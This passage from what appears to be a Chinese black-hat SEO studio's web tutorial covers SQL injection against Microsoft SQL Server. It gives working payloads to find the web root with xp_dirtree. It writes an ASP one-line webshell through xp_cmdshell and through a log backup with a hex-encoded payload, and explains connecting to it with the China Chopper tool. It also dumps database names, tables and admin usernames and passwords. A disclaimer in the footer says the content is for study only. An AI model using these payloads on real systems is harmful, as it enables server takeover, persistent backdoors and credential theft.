+# 8. temp1中已经保存了所有D盘第一级子目录下的所有目录,用同样的方法来判断根目录是否在此一级子目录下
+## 如果返回为真，表示根目录可能在此子目录下，记住要多测试几个例子，如果都返回为假，则表明WEB根目录不在此目录下
+## 用同样的方法来获得D盘第2、3...个子目录下的所有目录列表，来判断WEB根目录是否在其下。
+## 要注意，用xp_dirtree前一定要把temp1表中的内容删除。
+and (select count(*) from temp1 where dir&lt;&gt;'user')&lt;(select count(*) from temp1)
+# 9.假设WEB根目录在D盘的第一级子目录下，该子目录名称为website,
+## 前面我们知道了WEB根目录的深度为2，我们需要知道website下到底哪个才是真正的WEB根目录。
+## 用同样的方法，再建立第3个临时表 temp2
+;create table temp2(dir nvarchar(255),depth varchar(255));--
+# 10. 然后把从D盘的website下的所有目录存到temp2中
+declare @dirname varchar(255);set @dirname='D:/website/'+(select top 1 dir from (select top 1 dir from temp1 where depth=1 and dir not in('Documents and Settings','Program Files','RECYCLER','System Volume Information','WINDOWS','CAConfig','wmpub','Microsoft UAM 卷') order by dir desc)T order by dir);insert into temp2 exec master.dbo.xp_dirtree @dirname
+# 11.用同样的方法判断该目录是否为根目录
+## 如果返回为真，为了确定我们的判断，多测试几个例子，方法上面都讲到了，如果多个例子都返回为真，那么就确定了该目录为WEB根目录。
+and (select count(*) from temp2 where dir&lt;&gt;'user')&lt;(select count(*) from temp2)
+用以上的方法基本上可以获得WEB根目录，现在我们假设WEB根目录是：D:/website/www
+# 12. 查询临时表中的内容，也就是指定的目录文件和文件夹名。由于不能一次性获取所有目录文件和文件夹名，因此需要更改id的值，依次列出文件和文件夹来。
+and (select dir from temp where id=1)&gt;0
+</code></pre>
+<h3 id="2">2.获取数据库用户名</h3>
+<pre><code class="language-sql">'***.com and db_name() =O--
+</code></pre>
+<h3 id="3">3.写入一句话木马：</h3>
+<p>方法一：一句话木马'（通过中国菜刀）</p>
+<pre><code class="language-sql">%20;exec%20master..xp_cmdshell%20'Echo%20&quot;&lt;%eval%20request(&quot;chopper&quot;)%&gt;&quot;%20&gt;&gt;%20c:\wwwtest\iis-xxser.com--wwwroot\muma.asp'--
+
+# &lt;%eval%20request(&quot;chopper&quot;)%&gt;   是一句话木马，需要根据web的不同而变化
+# c:\wwwtest\iis-xxser.com--wwwroot\   是路径
+# muma.asp   是一句话木马的名字
+</code></pre>
+<p>方法二：差异备份'（此方法数据库必须曾经备份过事务日志）</p>
+<pre><code class="language-sql">;alter database testdb set RECOVERY FULL;create table test_tmp(str image);backup log testdb to disk='c:\test1' with init;insert into test_tmp(str) values (0x3C2565786375746528726571756573742822636D64222929253E);backup log testdb to disk='C:\wwwtest\iis-xxser.com--wwwroot\yjh.asp';alter database testdb set RECOVERY simple
+
+# (0x3C2565786375746528726571756573742822636D64222929253E)   是一句话木马的16进制编码
+# C:\wwwtest\iis-xxser.com--wwwroot\   是物理路径
+# yjh.asp   是一句话木马的名字
+</code></pre>
+<p>也可以使用工具代替上述操作（GetWebShell）,然后用菜刀连接目标
+* 地址为：目标的根目录地址然后/muma.asp
+* 密码为：“chopper”
+然后就可以进入对方的服务器了。</p>
+<h2 id="public">第八步：public权限利用方法</h2>
+<pre><code class="language-sql"># public权限检测
+and db_name()=0--
+# 1.获取mssql所有数据库名和路径
+%20and%200=(select%20top%202%20cast([name]%20as%20nvarchar(256))%2bchar(94)%2bcast([filename]%20as%20nvarchar(256))%20from%20(select%20top%202%20dbid,name,filename%20from%20[master].[dbo].[sysdatabases]%20order%20by%20[dbid])%20t%20order%20by%20[dbid]%20desc)--
+
+# 2.获取当前数据库所有表名
+and 0&lt;&gt;(select top 1 name from testdb.dbo.sysobjects where xtype=0x7500 and name not in (select top 2 name from testdb.dbo.sysobjects where xtype=0x7500))--
+
+# 3.爆表名及字段名
+having 1=1--  ●爆出了admin.id
+group by admin.id having 1=1--  ●又爆出了admin.name
+group by admin.id,admin.name having 1=1-- ●又爆出了admin.passwd
+# 4、获取字段内容
+//and//(select//top//1//isnull(cast([id]//as//nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([name]//as//nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]//as//nvarchar(4000)),char(32))//from//[testdb]..[admin]//where//1=1//and//id//not//in//(select//top//0//id//from//[testdb]..[admin]//where//1=1//group//by//id))%3E0//and//1=1
+</code></pre></div></article><nav class="pager"><a class="pg prev" href="../access-database-injection/"><span>上一篇</span><b>Access数据库注入</b></a><a class="pg next" href="../mysql-database-injection/"><span>下一篇</span><b>MYSQL数据库注入</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
